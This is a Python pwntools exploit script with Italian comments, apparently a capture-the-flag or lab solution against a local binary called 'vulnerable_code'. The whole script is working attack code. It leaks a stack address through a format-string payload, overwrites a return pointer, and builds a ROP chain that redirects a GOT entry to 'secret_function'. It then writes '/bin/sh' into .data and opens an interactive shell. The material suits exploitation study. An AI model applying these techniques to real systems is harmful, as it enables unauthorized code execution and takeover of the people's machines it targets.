from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

# *--------------------- Gadgets ---------------------*

where_to_write = p64(0x404058) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_r12_r13 = p64(0x40139c) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x40139e) # pop r13; pop r14; pop r15; ret;
pop_rdi = p64(0x4013a3) # pop rdi; ret;
pop_rbp = p64(0x4011fd) # pop rbp; ret;
pop_rsi = p64(0x4013a1) # pop rsi; pop r15; ret;
mov_rax_r13 = p64(0x4011d8) # mov rax, r13; ret;
mov_mmr13_r12 = p64(0x40116a) # mov qword ptr [r13], r12; ret;
add_mmrax_rbp = p64(0x401198) # add qword ptr [rax], rbp; ret;
xor_rdx = p64(0x401208) # xor edx, edx; ret;

# *------------------- Useful func -------------------*

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(list) : 
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./vulnerable_code',"./lib.so") # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(7)
p.sendline("1")
p.recvlines(3) # inserisci username 

# *--------------  return adress leak  ---------------*
ui.pause()
payload = dict()
payload[0] = b"%12$p\n"
p.sendline(fit(payload))

ret_idx = (int(p.recvline(False).decode('utf-8'),16) - 168).to_bytes(8,'little') 
log.info(f"Trovato l'indirzzo che punta all'istruzione di ritorno : 0x{ret_idx[::-1].hex()}")

# *---- sovrascrittura pointer per puntare a ret  ----*
payload = dict()
payload[3] = ret_idx
p.sendline(fit(payload))

# *---  calcolo offset tra le due funzioni di lib ----*

secretfunc_offset = libc.symbols["secret_function"] - libc.symbols["new_credentials_canary"]
binsh = "/bin/sh\x00"

# *----  ROP CHAIN -> scrittura in return adress  ----*

rop = ROP(elf)
rop.raw(pop_r13) # pop r13; pop r14; pop r15; ret;
rop.raw(elf.got["new_credentials_canary"]) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_rax_r13) # mov [r13], r12; ret;
rop.raw(pop_rbp) # pop rbp; ret;
rop.raw(secretfunc_offset) # rbp = offset secret_function - change_username
rop.raw(add_mmrax_rbp) # add [rax], rbp; add offset to got entry
rop.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop.raw(binsh) # r12 = "/bin/sh\x00"
rop.raw(where_to_write) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_mmr13_r12) # mov [r13], r12; ret;
rop.raw(xor_rdx) # rdx = 0x0000000000000000
rop.raw(pop_rsi) # pop rsi; pop r15; ret;
rop.raw(p64(0x00)) # rsi = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(pop_rdi) # pop rdi; ret;
rop.raw(where_to_write) # rdi = .data idx -> "/bin/sh\x00"
rop.raw(elf.plt["new_credentials_canary"]) # richiamiamo la funzione change_username ora che la sua entry nella got table Ã¨ stata modificata

payload =[
    (0,rop.chain())
    ]

send_payload(payload)

p.recvlines(3)
p.interactive()
# *------------------      END      ------------------*